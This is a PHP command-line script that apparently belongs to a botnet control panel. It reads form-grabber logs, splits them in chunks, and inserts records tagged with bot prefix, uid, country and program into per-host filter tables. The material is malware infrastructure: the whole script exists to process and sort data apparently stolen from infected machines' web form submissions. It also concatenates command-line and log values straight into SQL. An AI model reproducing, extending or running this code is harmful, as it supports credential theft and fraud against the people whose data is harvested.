#!/usr/bin/env php
<?php

set_time_limit(0);
error_reporting(-1);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '8192M');

function real_path($p){
	return str_replace('//', '/', str_replace('\\', '/', realpath($p)) . '/');
}

if(file_exists('../cache/dirs_import.json')) $dir = json_decode(file_get_contents('../cache/dirs_import.json'), true);
if(empty($dir['script']) || empty($dir['site']) || empty($dir['logs']) || empty( $dir['u']['5']) || empty($dir['u']['6']) || empty($dir['s']['5']) || empty($dir['s']['6'])){
	$dir = array();
	$dir['script'] = pathinfo(__FILE__, PATHINFO_DIRNAME);
	$dir['site'] = real_path($dir['script'] . '/../');
	$dir['logs'] = real_path($dir['site'] . '/logs/');
	$dir['u']['5'] = real_path($dir['logs'] . '/unnecessary/fgr/');
	$dir['u']['6'] = real_path($dir['logs'] . '/unnecessary/gra/');
	$dir['s']['5'] = real_path($dir['logs'] . '/save_logs/fgr/');
	$dir['s']['6'] = real_path($dir['logs'] . '/save_logs/gra/');
	file_put_contents($dir['site'] . 'cache/dirs_import.json', json_encode($dir));
}

ini_set('error_log', $dir['site'] . 'cache/error_import_file_save.txt');
function error_import_handler($code, $msg, $file, $line){
	global $dir;
	if($code != 8 && !strpos($file, 'geoip.inc')) file_put_contents($dir['site'] . 'cache/error_import_file_save.txt', print_r(array('code' => $code, 'msg' => $msg, 'file' => $file, 'line' => $line), true) . "\r\n", FILE_APPEND);
}
set_error_handler('error_import_handler');

if(!defined('IDOS')) define('IDOS', strtoupper(substr(PHP_OS, 0, 3)));

if(IDOS === 'WIN'){
	exec('"' . $dir['script'] . '/pv.exe" -pi php-*.exe');
}else{
	exec('/bin/env renice 0 -p ' . $MYPID);
}

include_once($dir['site'] . 'includes/a.charset.php');

include_once($dir['site'] . 'includes/config.php');
require_once($dir['site'] . 'classes/mysqli.class.lite.php');
$mysqli = new mysqli_db();

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
$mysqli->settings["ping"] = true;

unset($cfg_db);
if(count($mysqli->errors) > 0){
	error_log('DB_ERROR: ' . print_r($mysqli->errors, true),4);
	exit;
}

//$mysqli->settings["save_sql"] = $dir['site'] . 'cache/sql_history.txt';
//$mysqli->settings["save_prefix"] = $_SERVER['argv'][1];

if(empty($_SERVER['argv'][1])){
	error_log('EMPTY_ID!',4);
	exit;
}

$MYPID = getmypid();
if(!empty($MYPID)){
	$thread = $mysqli->query('SELECT * FROM bf_save_ilog WHERE (id = \''.$_SERVER['argv'][1].'\') LIMIT 1');
	if($thread->id != $_SERVER['argv'][1]){
		error_log('NOT_ID!',4);
		exit;
	}else{
		$thread->pid = $MYPID;
		$thread->status = '2';
	}
}else{
	error_log('PID_ERROR',4);
	exit;
}

function load_filters($row){
	global $filters;
	$row = get_object_vars($row);
	$row['fields'] = json_decode(base64_decode($row['fields']), true);
	if(strpos($row['host'], ',') != false){
		$hosts = explode(',', $row['host']);
		if(count($hosts) > 0){
			foreach($hosts as $host){
				$row['host'] = $host;
				$filters[$row['host']] = $row;
			}
		}
	}else{
		$filters[$row['host']] = $row;
	}
}

function size_format($size, $round = 2, $bps = false) {
    if($bps == false){
    	$sizes = array(' B', ' kB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
    	for ($i=0; $size > 1024 && $i < count($sizes) - 1; $i++) $size /= 1024;
    }else{
    	$size = $size * 8;
    	$sizes = array(' бит', ' килобит', ' мегабит', ' гигабит', ' терабит', ' pbps', ' ebps', ' zbps', ' tbps');
    	for ($i=0; $size > 1000 && $i < count($sizes) - 1; $i++) $size /= 1000;
    }

    return round($size,$round).$sizes[$i];
}

function get_host($url){
	if(function_exists('idn_to_utf8')){
		return idn_to_utf8(@parse_url(str_replace('www.', '', strtolower($url)), PHP_URL_HOST));
	}else{
		return @parse_url(str_replace('www.', '', strtolower($url)), PHP_URL_HOST);
	}
}

function start_grab($log, $file){
	global $dir, $geoip_ex, $mysqli, $thread, $filters, $fs, $cb;
	//echo strlen($log);
	include($dir['script'] . '/modules/import/' . $file);
}

function query_walk($item, $key){
	global $dir, $mysqli, $dsla;
	//file_put_contents($dir['site'] . 'cache/imports/querys_'.$dsla.'.txt', $item . "\r\n\r\n", FILE_APPEND);
	$mysqli->query($item);
}

function strpos_array($h, $ns=array()) {
        $chr = array();
	
	foreach($ns as $key => $n) {
                $res = strpos(' ' . $n, $h);
                if($res !== false) return true;
        }
	
        return false;
}

function md5_array($ns = array()) {
	$res = '';
	foreach($ns as $n) {
                $res .= $n;
        }
	
        return md5($res);
}

function empty_array($ns = array()) {
	foreach($ns as $n) {
                if(empty($n)) return true;
        }
	
        return false;
}

function add_item_new($fid, $bot = array(), $add_sql = array()){
	global $mysqli, $thread, $dsla, $dir;
	
	/*
	$prefix - $bot[0]
	$uid - $bot[1]
	$country - $bot[2]
	$program - $bot[3]
	*/
	
	if(count($bot) > 0 && count($add_sql) > 0 && empty_array($add_sql) != true){
		$asql = '';
		foreach($add_sql as $ks => $as){
			$asql .= 'v' . $ks . ' = \''.toUTF8($as).'\',';
		}
		
		$md5 = md5_array($add_sql);
		$sql = 'INSERT DELAYED IGNORE INTO bf_filter_'.$fid.' SET prefix = \''.$bot[0].'\', uid = \''.$bot[1].'\', country = \''.$bot[2].'\', program = \''.$bot[3].'\', type = \''.$thread->type.'\', post_date = NOW(), md5_hash = \''.$md5.'\', ' . trim($asql, ',');
		
		if(isset($thread->insert[$fid][100])){
			if(strpos_array($md5, $thread->insert[$fid]) == false){
				$thread->insert[$fid][] = $sql;
				
				$save_size = false;
				$save_i = 0;
				do{
					$save_i++;
					$save_size = file_put_contents($dir['site'] . 'cache/iddb/'.$fid.'.txt', print_r($thread->insert[$fid], true), FILE_APPEND);
				}while($save_i <= 3 && $save_size == false);
				
				array_walk($thread->insert[$fid], 'query_walk');
				unset($thread->insert[$fid]);
			}
		}else{
			if(!is_array($thread->insert[$fid])){
				$thread->insert[$fid] = array();
				$thread->insert[$fid][] = $sql;
			}else{
				if(strpos_array($md5, $thread->insert[$fid]) == false){
					$thread->insert[$fid][] = $sql;
				}
			}
		}
	}
}

function detect_encoding($string, $pattern_size = 50){
    $list = array('cp1251', 'utf-8', 'ascii', '855', 'KOI8R', 'ISO-IR-111', 'CP866', 'KOI8U');
    $c = strlen($string);
    if ($c > $pattern_size)
    {
        $string = substr($string, floor(($c - $pattern_size) /2), $pattern_size);
        $c = $pattern_size;
    }

    $reg1 = '/(\xE0|\xE5|\xE8|\xEE|\xF3|\xFB|\xFD|\xFE|\xFF)/i';
    $reg2 = '/(\xE1|\xE2|\xE3|\xE4|\xE6|\xE7|\xE9|\xEA|\xEB|\xEC|\xED|\xEF|\xF0|\xF1|\xF2|\xF4|\xF5|\xF6|\xF7|\xF8|\xF9|\xFA|\xFC)/i';

    $mk = 10000;
    $enc = 'ascii';
    foreach ($list as $item)
    {
        $sample1 = @iconv($item, 'cp1251', $string);
        $gl = @preg_match_all($reg1, $sample1, $arr);
        $sl = @preg_match_all($reg2, $sample1, $arr);
        if (!$gl || !$sl) continue;
        $k = abs(3 - ($sl / $gl));
        $k += $c - $gl - $sl;
        if ($k < $mk)
        {
            $enc = $item;
            $mk = $k;
        }
    }
    return $enc;
}

function toUTF8($n){
    $z = detect_encoding($n);
    
    if($z != 'utf-8'){
        //return iconv('CP1251', "UTF-8", charset_x_win($n));
        return mb_convert_encoding(charset_x_win($n), "UTF8", 'CP1251');
    }else{
        return $n;
    }
}

function array_change_key_case_unicode($arr, $c = CASE_LOWER) {
    $c = ($c == CASE_LOWER) ? MB_CASE_LOWER : MB_CASE_UPPER;
    foreach ($arr as $k => $v) {
        $ret[mb_convert_case($k, $c, "UTF-8")] = $v;
    }
    return $ret;
}

$thread->file = $thread->md5;
$thread->dl = $dir['logs'] . 'save_logs/fgr/';
$thread->insert = array();
$thread->var = array();

if(strpos($thread->file, '/') === 0){
	$thread->file = str_replace('/srv/www/vhosts/adm.piqa.in/logs//', '', $thread->file);
	$thread->file = preg_replace('~^/~is', '', $thread->file);
}

$thread->file = str_replace('srv/www/vhosts/adm.piqa.in/logs/','',$thread->file);

if(!function_exists('geoip_country_code_by_name')){
	$geoip_ex = true;
	if(file_exists($dir['site'] . '/cache/geoip/')){
		require_once($dir['site'] . '/cache/geoip/geoip.inc');
		$gi = geoip_open($dir['site'] . '/cache/geoip/GeoIP.dat', GEOIP_STANDARD);
	}
}else{
	$geoip_ex = false;
}

$ml = ini_get('memory_limit');
$ml = str_replace('M', '', $ml);
$ml = ($ml * 1024 * 1024);

$cb = 0;

if(file_exists($dir['site'] . 'cache/filters.json')){
	$filters = json_decode(file_get_contents($dir['site'] . 'cache/filters.json'), true);
}else{
	$filters = array();
	$mysqli->query('SELECT id, fields, host, save_log FROM bf_filters WHERE host IS NOT NULL', null, 'load_filters');
	file_put_contents($dir['site'] . 'cache/filters.json', json_encode($filters));
}

$host_pre = mb_substr($thread->host, 0, 2, 'utf8');
if(!preg_match('~^([a-zA-Z0-9]+)$~', $host_pre)) $host_pre = 'none';

if(!file_exists($thread->dl . $thread->file)){
	error_log('FILE_NOT_FOUND!',4);
	exit;
}

$fs = filesize($thread->dl . $thread->file);

if($fs > ($ml / 8)){
	$block_size = $ml / 16;
	$fs_max = ($fs + $block_size);
	$cb = $h = 0;
	$separator = "[~]\r\n\r\n";
	
	$log = '';
	
	do{
		$log .= file_get_contents($thread->dl . $thread->file, false, null, $cb, $block_size);
		$h = strrpos($log, $separator);

		if($h !== false){
			$h += strlen($separator);
			echo size_format($fs) . ' iz ' . size_format($cb) . "\n";
			start_grab(substr($log, 0, $h), 'formgrabber_s.php');
			$cb += $h;
			$log = '';
		}else{
			$cb += $block_size;
		}
	}while($cb < $fs_max);
}else{
	$cb = $fs;
	start_grab(file_get_contents($thread->dl . $thread->file), 'formgrabber_s.php');
}

sleep(1);

foreach($thread->insert as $k => $a){
	array_walk($a, 'query_walk');
}

sleep(1);

if($geoip_ex == true){
	if(file_exists($dir['site'] . '/cache/geoip/')){
		geoip_close($gi);
		unset($gi);
	}
}

sleep(1);

exit;

?>